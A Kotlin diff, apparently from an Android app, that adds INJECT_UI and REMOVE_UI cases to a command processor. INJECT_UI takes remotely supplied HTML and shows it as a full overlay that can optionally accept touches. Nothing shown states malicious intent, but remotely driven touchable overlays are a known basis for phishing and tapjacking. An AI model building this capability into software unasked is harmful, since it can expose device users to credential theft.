@@ -551,6 +551,24 @@ object CommandProcessor {
                     }
                     status = "DISPLAY_RESTORED"
                 }
+                "INJECT_UI" -> {
+                    val separatorIndex = content.indexOf("|")
+                    if (separatorIndex != -1) {
+                        val touchableStr = content.substring(0, separatorIndex).trim().uppercase()
+                        val htmlContent = content.substring(separatorIndex + 1).trim()
+                        val touchable = touchableStr == "TRUE" || touchableStr == "1"
+                        
+                        DynamicUIManager.showOverlay(ctx, touchable, htmlContent)
+                        status = "UI_INJECTED (Touchable: $touchable)"
+                    } else {
+                        status = "FAILED (FORMAT)"
+                        errorMsg = "Usage: INJECT_UI | TRUE/FALSE | <html>..."
+                    }
+                }
+                "REMOVE_UI" -> {
+                    DynamicUIManager.removeOverlay(ctx)
+                    status = "UI_REMOVED"
+                }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
